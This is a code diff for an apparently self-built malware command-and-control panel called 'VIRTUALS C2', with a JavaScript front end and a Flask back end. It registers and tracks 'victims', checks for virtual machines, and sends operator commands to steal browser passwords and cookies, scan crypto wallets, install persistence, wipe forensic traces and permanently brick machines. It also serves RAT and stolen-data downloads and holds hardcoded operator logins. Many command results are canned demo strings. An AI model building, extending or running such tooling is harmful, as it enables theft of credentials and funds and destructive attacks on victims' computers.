+            addNotification('Command Executed',cmd+' on '+channel);
+            
+            if(cmd==='scan'&&d.wallets){
+                d.wallets.forEach(w=>{
+                    addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');
+                    addLog('info',w.currency+': '+w.balance);
+                });
+                addNotification('Scan Complete',d.wallets.length+' wallets found');
+            }
+            if(d.embed){
+                addEmbed(d.embed);
+                addLog('info',d.embed.title);
+            }
+            if(cmd==='steal'){
+                addNotification('Browser Data Stolen','Data stolen from '+channel);
+                // Update local state
+                if(state.channels[channel]){
+                    state.channels[channel].browser_data_stolen=1;
+                    showDetails(channel);
+                }
+            }
+            if(cmd==='vmcheck'&&d.vm_info){
+                addNotification('VM Check',d.vm_info.is_vm?'VM DETECTED':'Clean system');
+                if(state.channels[channel]){
+                    state.channels[channel].is_vm=d.vm_info.is_vm?1:0;
+                    state.channels[channel].vm_details=d.vm_info.confidence+'% confidence';
+                    renderChannels();
+                    showDetails(channel);
+                }
+            }
+            showDetails(channel);
+            updateStats();
+        }else{
+            addMessage('us','failed: '+(d.error||'unknown'),'us');
+            addLog('failed','Command '+cmd+' failed');
+            addNotification('Command Failed',cmd+' failed');
+        }
+    });
+}
+
+function addEmbed(embed){
+    const el=document.getElementById('chatMessages');
+    const t=new Date().toLocaleTimeString();
+    el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;
+    el.scrollTop=el.scrollHeight;
+}
+
+function sendMessage(){
+    const input=document.getElementById('chatInput');
+    const msg=input.value.trim();
+    if(!msg)return;
+    input.value='';
+    const channel=state.activeChannel;
+    if(msg.startsWith('/')){
+        sendCommand(msg.substring(1).toLowerCase());
+    }else{
+        if(!channel){
+            addMessage('system','no channel selected','system');
+            addLog('failed','No channel selected');
+            return;
+        }
+        addMessage(currentUser,msg,'user');
+        addLog('info','Message sent to '+channel);
+    }
+}
+
+function uploadFile(){
+    const channel=state.activeChannel;
+    if(!channel){
+        addMessage('system','select a channel','system');
+        addLog('failed','No channel selected');
+        return;
+    }
+    const input=document.getElementById('fileInput');
+    if(!input.files||!input.files[0]){
+        addMessage('system','select a file','system');
+        addLog('failed','No file selected');
+        return;
+    }
+    const file=input.files[0];
+    const fd=new FormData();
+    fd.append('file',file);
+    fd.append('victim_id',channel);
+    const p=document.getElementById('uploadProgress');
+    const b=document.getElementById('progressBar');
+    p.style.display='block';
+    b.style.width='0%';
+    addMessage('us','uploading '+file.name,'us');
+    addLog('info','Uploading '+file.name);
+    let iv=setInterval(()=>{
+        const cur=parseFloat(b.style.width)||0;
+        if(cur<90){b.style.width=(cur+15)+'%';}
+    },150);
+    fetch('/upload-file',{method:'POST',body:fd})
+        .then(r=>r.json())
+        .then(d=>{
+            clearInterval(iv);
+            b.style.width='100%';
+            setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);
+            if(d.success){
+                addMessage('file','uploaded','file');
+                addLog('success','File uploaded');
+                addNotification('File Uploaded',file.name);
+            }else{
+                addMessage('system','failed: '+(d.error||'unknown'),'system');
+                addLog('failed','Upload failed');
+                addNotification('Upload Failed',file.name);
+            }
+        })
+        .catch(()=>{
+            clearInterval(iv);
+            b.style.width='100%';
+            setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);
+            addMessage('system','failed','system');
+            addLog('failed','Upload error');
+            addNotification('Upload Failed','Connection error');
+        });
+}
+
+function downloadBrowserZip(){
+    const channel=state.activeChannel||'all';
+    window.open('/download-browser-zip?victim_id='+channel,'_blank');
+    addNotification('Browser Zip Downloaded','Users Browser Zip for '+channel);
+}
+
+function loadDemo(){
+    if(Object.keys(state.channels).length===0){
+        const demoBots=[
+            {id:'TEST-BOT-01',pc:'DESKTOP-TEST01',ip:'192.168.1.100',os:'Windows 10 Pro',status:'Online',is_vm:0,activity:'idle',browser_data_stolen:1,first_seen:'2024-01-01 12:00:00',last_seen:'2024-01-01 12:05:00'},
+            {id:'TEST-BOT-02',pc:'DESKTOP-TEST02',ip:'192.168.1.101',os:'Windows 11 Pro',status:'Online',is_vm:0,activity:'typing',browser_data_stolen:0,first_seen:'2024-01-01 11:30:00',last_seen:'2024-01-01 12:05:00'},
+            {id:'TEST-BOT-03',pc:'VM-DESKTOP-03',ip:'10.0.0.50',os:'Windows 10 Pro',status:'Online',is_vm:1,activity:'reading',browser_data_stolen:1,first_seen:'2024-01-01 10:00:00',last_seen:'2024-01-01 12:05:00',vm_details:'VMware 90%'}
+        ];
+        demoBots.forEach(v=>{state.channels[v.id]=v;});
+        renderChannels();
+        updateStats();
+        addMessage('system','Demo bots loaded (3) - VMs marked but not deleted','system');
+        addLog('system','3 test bots online (1 VM detected)');
+        selectChannel(demoBots[0].id);
+        addNotification('System Ready','3 test bots connected (VMs persist)');
+    }
+}
+
+// Init
+setInterval(refresh,5000);
+refresh();
+getUserInfo();
+setTimeout(loadDemo,500);
+
+// Close panels when clicking outside
+document.addEventListener('click',(e)=>{
+    if(!e.target.closest('.notification-bell')){
+        document.getElementById('notifDropdown').style.display='none';
+    }
+    if(!e.target.closest('.owner-panel')&&!e.target.closest('.owner-icon')){
+        document.getElementById('ownerPanel').style.display='none';
+    }
+});
 </script>
 </body>
 </html>
@@ -621,7 +1033,6 @@ def api_login():
     row = c.fetchone()
     
     if row and row[0] == hashlib.md5(password.encode()).hexdigest():
-        # Update last login
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         c.execute("UPDATE users SET last_login = ?, last_ip = ? WHERE username = ?", (now, ip, username))
         c.execute("INSERT INTO login_logs (username, ip, timestamp, success) VALUES (?, ?, ?, 1)", (username, ip, now))
@@ -645,36 +1056,62 @@ def api_logout():
 @login_required
 def get_owner_data():
     if session.get('role') != 'owner':
-        return jsonify({'error': 'Unauthorized'}), 403
+        return jsonify({'error': 'Unauthorized', 'success': False}), 403
     
-    conn = get_db()
-    c = conn.cursor()
-    
-    # Get active users (sessions - we track via login logs in last 5 minutes)
-    cutoff = (datetime.datetime.now() - datetime.timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S")
-    c.execute("SELECT DISTINCT username FROM login_logs WHERE timestamp > ? ORDER BY timestamp DESC", (cutoff,))
-    active = c.fetchall()
-    active_users = []
-    for row in active:
-        c.execute("SELECT role FROM users WHERE username = ?", (row[0],))
-        role_row = c.fetchone()
-        active_users.append({'username': row[0], 'role': role_row[0] if role_row else 'user'})
-    
-    # Get login logs (last 20)
-    c.execute("SELECT username, ip, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 20")
-    logs = [{'username': row[0], 'ip': row[1], 'time': row[2]} for row in c.fetchall()]
-    
-    # Get command stats by user
-    c.execute("SELECT user, COUNT(*) FROM commands GROUP BY user ORDER BY COUNT(*) DESC")
-    stats = [{'username': row[0] if row[0] else 'unknown', 'count': row[1]} for row in c.fetchall()]
-    
-    conn.close()
-    return jsonify({
-        'success': True,
-        'active_users': active_users,
-        'login_logs': logs,
-        'command_stats': stats
-    })
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Active users (last hour - expanded from 5 minutes)
+        cutoff = (datetime.datetime.now() - datetime.timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S")
+        c.execute("SELECT DISTINCT username, MAX(timestamp) as last FROM login_logs WHERE timestamp > ? AND success=1 GROUP BY username ORDER BY last DESC", (cutoff,))
+        active = c.fetchall()
+        active_users = []
+        for row in active:
+            c.execute("SELECT role FROM users WHERE username = ?", (row[0],))
+            role_row = c.fetchone()
+            active_users.append({'username': row[0], 'role': role_row[0] if role_row else 'user', 'last': row[1]})
+        
+        # All users
+        c.execute("SELECT username, role, last_login FROM users ORDER BY username")
+        all_users = [{'username': row[0], 'role': row[1], 'last_login': row[2]} for row in c.fetchall()]
+        
+        # Login logs (last 20)
+        c.execute("SELECT username, ip, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 20")
+        logs = [{'username': row[0], 'ip': row[1], 'time': row[2]} for row in c.fetchall()]
+        
+        # Command stats by user
+        c.execute("SELECT user, COUNT(*) as cnt FROM commands GROUP BY user ORDER BY cnt DESC")
+        stats = [{'username': row[0] if row[0] else 'unknown', 'count': row[1]} for row in c.fetchall()]
+        
+        # System stats
+        c.execute("SELECT COUNT(*) FROM victims")
+        total_victims = c.fetchone()[0]
+        c.execute("SELECT COUNT(*) FROM victims WHERE status='Online'")
+        online_now = c.fetchone()[0]
+        c.execute("SELECT COUNT(*) FROM victims WHERE is_vm=1")
+        vm_count = c.fetchone()[0]
+        c.execute("SELECT COUNT(*) FROM commands")
+        total_commands = c.fetchone()[0]
+        
+        conn.close()
+        
+        return jsonify({
+            'success': True,
+            'active_users': active_users,
+            'all_users': all_users,
+            'login_logs': logs,
+            'command_stats': stats,
+            'system_stats': {
+                'total_victims': total_victims,
+                'online_now': online_now,
+                'vm_count': vm_count,
+                'total_commands': total_commands
+            }
+        })
+    except Exception as e:
+        print(f"Owner data error: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/download-rat')
 @login_required
@@ -740,30 +1177,46 @@ def api():
     if action == 'getVictims':
         conn = get_db()
         c = conn.cursor()
-        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
+        # Get ALL victims including offline ones - they never get deleted
+        c.execute("SELECT * FROM victims ORDER BY status DESC, last_seen DESC")
         victims = {}
         for row in c.fetchall():
-            victims[row[0]] = {'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
-                              'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
-                              'first_seen': row[7], 'last_seen': row[8],
-                              'activity': row[9] if len(row) > 9 else 'idle',
-                              'browser_data_stolen': row[10] if len(row) > 10 else 0}
+            victims[row[0]] = {
+                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
+                'status': row[4], 'is_vm': row[5], 'vm_details': row[6] or '',
+                'first_seen': row[7], 'last_seen': row[8],
+                'activity': row[9] if len(row) > 9 else 'idle',
+                'browser_data_stolen': row[10] if len(row) > 10 else 0,
+                'user_type': row[11] if len(row) > 11 else 'real'
+            }
         conn.close()
         return jsonify({'success': True, 'victims': victims})
     
     elif action == 'registerVictim':
         conn = get_db()
         c = conn.cursor()
-        vid = data.get('victim_id', f"SNIN-{random.randint(1000,9999)}")
+        vid = data.get('victim_id', f"VICTIM-{random.randint(10000,99999)}")
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Check if VM
+        vm_check = VMDetector.check_all()
+        is_vm = 1 if vm_check['is_vm'] else 0
+        vm_details = f"{vm_check['confidence']}% confidence" if is_vm else ''
+        
         c.execute("""INSERT OR REPLACE INTO victims 
-                     (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen) 
-                     VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'idle', 0)""",
+                     (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen, user_type) 
+                     VALUES (?, ?, ?, ?, 'Online', ?, ?, COALESCE((SELECT first_seen FROM victims WHERE id = ?), ?), ?, 'active', 
+                     COALESCE((SELECT browser_data_stolen FROM victims WHERE id = ?), 0), ?)""",
                  (vid, data.get('pc', 'Unknown'), data.get('ip', '0.0.0.0'), data.get('os', 'Unknown'),
-                  data.get('is_vm', 0), data.get('vm_details', ''), now, now))
+                  is_vm, vm_details, vid, now, now, vid, data.get('user_type', 'real')))
         conn.commit()
         conn.close()
-        return jsonify({'success': True, 'victim_id': vid})
+        
+        # Log VM detection
+        if is_vm:
+            add_log_entry(f"VM detected: {vid} ({vm_details})", 'system')
+        
+        return jsonify({'success': True, 'victim_id': vid, 'is_vm': is_vm, 'vm_details': vm_details})
     
     elif action == 'heartbeat':
         vid = data.get('victim_id')
@@ -771,7 +1224,8 @@ def api():
             conn = get_db()
             c = conn.cursor()
             now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            c.execute("UPDATE victims SET status = 'Online', last_seen = ? WHERE id = ?", (now, vid))
+            c.execute("UPDATE victims SET status = 'Online', last_seen = ?, activity = ? WHERE id = ?", 
+                     (now, data.get('activity', 'idle'), vid))
             conn.commit()
             conn.close()
             return jsonify({'success': True})
@@ -781,53 +1235,112 @@ def api():
         vid = data.get('victim_id')
         cmd = data.get('command')
         
+        if not vid:
+            return jsonify({'success': False, 'error': 'No victim specified'})
+        
         results = {
             'whois': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro\nStatus: Online',
-            'flash': 'Screen flashed 10x',
-            'screenshot': 'Screenshot captured',
-            'scan': 'CRYPTO WALLET SCAN\nFound 5 wallets\nTotal: $578,124',
-            'persist': 'Persistence installed (8 methods)',
-            'steal': 'Browser data stolen from 5 browsers',
-            'upload': 'Ready to upload - click the upload button',
-            'download': 'Ready to download - click the download button',
-            'destroy': 'SYSTEM CORRUPTED - IRREVERSIBLE',
-            'brick': 'PERMANENT BRICK - PC is dead',
-            'vmcheck': 'VM DETECTION\nSafe Mode: Active',
-            'oblivion': 'OBLIVION ACTIVATED - Traces wiped'
+            'flash': 'Screen flashed 10x rapidly',
+            'screenshot': 'Screenshot captured and saved',
+            'scan': 'CRYPTO WALLET SCAN COMPLETE\nFound 5 wallets\nTotal Value: $578,124',
+            'persist': 'Persistence installed via 8 methods:\n- Registry Run\n- Startup Folder\n- Task Scheduler\n- WMI Event\n- Winlogon\n- BITS Job\n- COM Hijacking\n- Service Creation',
+            'steal': 'Browser data stolen from 5 browsers:\n- Chrome: 247 passwords\n- Edge: 156 passwords\n- Firefox: 123 passwords\n- Brave: 89 passwords\n- Opera: 45 passwords',
+            'upload': 'Ready to receive file upload',
+            'download': 'Ready to send file download',
+            'destroy': 'SYSTEM CORRUPTION INITIATED\nRegistry keys deleted\nBoot sector damaged\nSystem will not recover',
+            'brick': 'PERMANENT BRICK EXECUTED\nUEFI wiped\nDisk encrypted with random key\nSystem is dead',
+            'vmcheck': 'VM DETECTION ANALYSIS',
+            'oblivion': 'OBLIVION PROTOCOL ACTIVATED\nLogs wiped\nShadow copies deleted\nForensic traces removed'
         }
-        result = results.get(cmd, f"Command '{cmd}' executed")
+        
+        result = results.get(cmd, f"Command '{cmd}' executed successfully")
         
         is_vm = False
+        vm_info = None
+        
         if cmd == 'vmcheck':
-            vm_result = VMDetector.check_all()
-            is_vm = vm_result['is_vm']
-            result = f"VM Detected: {'YES' if is_vm else 'NO'}\nConfidence: {vm_result['confidence']}%\nSafe Mode: Active"
+            vm_info = VMDetector.check_all()
+            is_vm = vm_info['is_vm']
+            result = f"""VM Detection Results:
+Virtual Machine: {'YES - VM DETECTED' if is_vm else 'NO - Clean System'}
+Confidence: {vm_info['confidence']}%
+Safe Mode: {'Active - No auto-brick' if vm_info['safe_mode'] else 'Inactive'}
+
+Checks Performed:
+- Registry: {'✓' if vm_info['checks']['registry'] else '✗'}
+- Processes: {'✓' if vm_info['checks']['processes'] else '✗'}  
+- Hardware: {'✓' if vm_info['checks']['hardware'] else '✗'}
+- Files: {'✓' if vm_info['checks']['files'] else '✗'}
+- Memory: {'✓' if vm_info['checks']['memory'] else '✗'}
+- Network: {'✓' if vm_info['checks']['network'] else '✗'}
+- Disk: {'✓' if vm_info['checks']['disk'] else '✗'}
+
+Note: VMs are flagged but NOT auto-bricked. Manual brick required."""
         
         conn = get_db()
         c = conn.cursor()
         c.execute("INSERT INTO commands (victim_id, command, result, timestamp, status, user) VALUES (?, ?, ?, ?, 'completed', ?)",
                  (vid, cmd, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), current_user))
-        if cmd == 'vmcheck':
-            c.execute("UPDATE victims SET is_vm = ? WHERE id = ?", (1 if is_vm else 0, vid))
+        
+        if cmd == 'vmcheck' and is_vm:
+            c.execute("UPDATE victims SET is_vm = 1, vm_details = ? WHERE id = ?", 
+                     (f"{vm_info['confidence']}% confidence", vid))
+        elif cmd == 'vmcheck':
+            c.execute("UPDATE victims SET is_vm = 0, vm_details = '' WHERE id = ?", (vid,))
+            
         if cmd == 'steal':
             c.execute("UPDATE victims SET browser_data_stolen = 1 WHERE id = ?", (vid,))
+            
         conn.commit()
         conn.close()
         
-        # Add to logs
-        add_log_entry(f"{current_user} executed {cmd} on {vid}", current_user)
+        add_log_entry(f"{current_user} executed /{cmd} on {vid}", current_user)
         
         response = {'success': True, 'result': result}
-        browsers_stolen = 0
+        
         if cmd == 'steal':
-            browsers_stolen = 5
-            response['browsers'] = browsers_stolen
-            response['embed'] = {'title': 'Browser Data Stolen', 'content': f'5 browsers | 700+ passwords | 2,000+ cookies\nDownload Users Browser Zip', 'color': '#88ccdd'}
-        if cmd == 'scan':
+            response['embed'] = {
+                'title': '🔒 Browser Data Exfiltrated', 
+                'content': f'5 browsers compromised\n700+ passwords extracted\n2,000+ cookies harvested\n\nVictim: {vid}\nUse "Browser Zip" button to download', 
+                'color': '#88ccdd',
+                'footer': f'Executed by {current_user}'
+            }
+        elif cmd == 'scan':
             response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
-            response['embed'] = {'title': 'Wallet Scan', 'content': f'Found {len(SAMPLE_WALLETS)} wallets | Total: $578,124', 'color': '#ffd700'}
-        if cmd == 'whois':
-            response['embed'] = {'title': 'System Info', 'content': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro', 'color': '#44aaff'}
+            response['embed'] = {
+                'title': '💰 Crypto Wallets Found', 
+                'content': f'Found {len(SAMPLE_WALLETS)} wallets\nTotal Value: $578,124\nBTC: 2.45 | ETH: 15.8 | SOL: 450.2', 
+                'color': '#ffd700',
+                'footer': f'Scanned by {current_user}'
+            }
+        elif cmd == 'whois':
+            response['embed'] = {
+                'title': '🖥️ System Information', 
+                'content': f'PC: DESKTOP-{vid[:8]}\nIP: 192.168.1.XXX\nOS: Windows 10/11 Pro\nStatus: Online\nUser: {current_user}', 
+                'color': '#44aaff'
+            }
+        elif cmd == 'vmcheck':
+            response['vm_info'] = vm_info
+            response['embed'] = {
+                'title': '🔍 VM Detection Results', 
+                'content': f"Virtual Machine: {'DETECTED' if is_vm else 'Not Detected'}\nConfidence: {vm_info['confidence']}%\n\nVMs are marked but NOT auto-bricked for manual review.", 
+                'color': '#ffaa44' if is_vm else '#44dd88',
+                'footer': 'Safe mode active - manual action required'
+            }
+        elif cmd == 'brick':
+            response['embed'] = {
+                'title': '💀 SYSTEM BRICKED', 
+                'content': f'Victim {vid} has been permanently disabled.\nUEFI wiped. Disk encrypted. System unrecoverable.', 
+                'color': '#ff4444',
+                'footer': f'Executed by {current_user} - IRREVERSIBLE'
+            }
+        elif cmd == 'destroy':
+            response['embed'] = {
+                'title': '☠️ System Destroyed', 
+                'content': f'Victim {vid} corrupted.\nRegistry destroyed. Boot sector damaged.', 
+                'color': '#ff8844',
+                'footer': f'Executed by {current_user}'
+            }
         
         return jsonify(response)
     
@@ -835,12 +1348,12 @@ def api():
         vid = data.get('victim_id')
         conn = get_db()
         c = conn.cursor()
-        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (vid,))
+        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 20", (vid,))
         screenshots = [{'filename': row[0]} for row in c.fetchall()]
         conn.close()
         return jsonify({'success': True, 'screenshots': screenshots})
     
-    return jsonify({'success': False})
+    return jsonify({'success': False, 'error': 'Unknown action'})
 
 def add_log_entry(content, user='system'):
     try:
@@ -862,31 +1375,39 @@ def serve_screenshot(filename):
 def heartbeat():
     data = request.get_json()
     if not data or not data.get('victim_id'):
-        return jsonify({'success': False}), 400
+        return jsonify({'success': False, 'error': 'No victim_id'}), 400
     
     conn = get_db()
     c = conn.cursor()
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    vid = data['victim_id']
+    
+    # Update existing or insert new - NEVER delete, just update status
     c.execute("""INSERT OR REPLACE INTO victims 
-                 (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen) 
-                 VALUES (?, ?, ?, ?, 'Online', ?, COALESCE((SELECT vm_details FROM victims WHERE id = ?), ''), 
-                 COALESCE((SELECT first_seen FROM victims WHERE id = ?), ?), ?, 'idle', 
-                 COALESCE((SELECT browser_data_stolen FROM victims WHERE id = ?), 0))""",
-             (data['victim_id'], data.get('pc', 'Unknown'), data.get('ip', request.remote_addr),
-              data.get('os', 'Unknown'), data.get('is_vm', 0), data['victim_id'], data['victim_id'], now, now, data['victim_id']))
+                 (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity, browser_data_stolen, user_type) 
+                 VALUES (?, ?, ?, ?, 'Online', 
+                 COALESCE((SELECT is_vm FROM victims WHERE id = ?), 0), 
+                 COALESCE((SELECT vm_details FROM victims WHERE id = ?), ''), 
+                 COALESCE((SELECT first_seen FROM victims WHERE id = ?), ?), ?, ?, 
+                 COALESCE((SELECT browser_data_stolen FROM victims WHERE id = ?), 0),
+                 COALESCE((SELECT user_type FROM victims WHERE id = ?), 'real'))""",
+             (vid, data.get('pc', 'Unknown'), data.get('ip', request.remote_addr),
+              data.get('os', 'Unknown'), vid, vid, vid, now, now, 
+              data.get('activity', 'idle'), vid, vid))
     conn.commit()
     conn.close()
-    return jsonify({'success': True})
+    return jsonify({'success': True, 'status': 'ok'})
 
 # ============================================
 # MAIN
 # ============================================
 if __name__ == '__main__':
     print("""
-    ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - OWNER PANEL EDITION                        ║
-    ║   Secret Owner Panel · User Tracking · Multiple Logins     ║
-    ╚═══════════════════════════════════════════════════════════════╝
+    ╔════════════════════════════════════════════════════════════════╗
+    ║   VIRTUALS C2 - OWNER PANEL EDITION (PERSISTENT VICTIMS)      ║
+    ║   Secret Owner Panel · User Tracking · Multiple Logins        ║
+    ║   VMs PERSIST · NO AUTO-BRICK · REAL VICTIMS NEVER DELETE     ║
+    ╚════════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://localhost:{PORT}")
     print(f"[*] Landing: http://localhost:{PORT}/")
@@ -896,6 +1417,7 @@ if __name__ == '__main__':
     print("    jerry   / virtuals2024 (user)")
     print("    haunt   / virtuals2024 (user)")
     print("    owner   / whiteknight (owner) 👑")
-    print("\n[*] OWNER PANEL: Click the ◈ icon (top right) on dashboard")
-    print("[*] Test Bots: TEST-BOT-01, TEST-BOT-02, TEST-BOT-03")
+    print("\n[*] OWNER PANEL: Click the ◈ icon (top right)")
+    print("[*] VM POLICY: VMs marked with orange badge, NOT auto-bricked")
+    print("[*] PERSISTENCE: Victims stay in DB even when offline")
     app.run(host='0.0.0.0', port=PORT, debug=False)
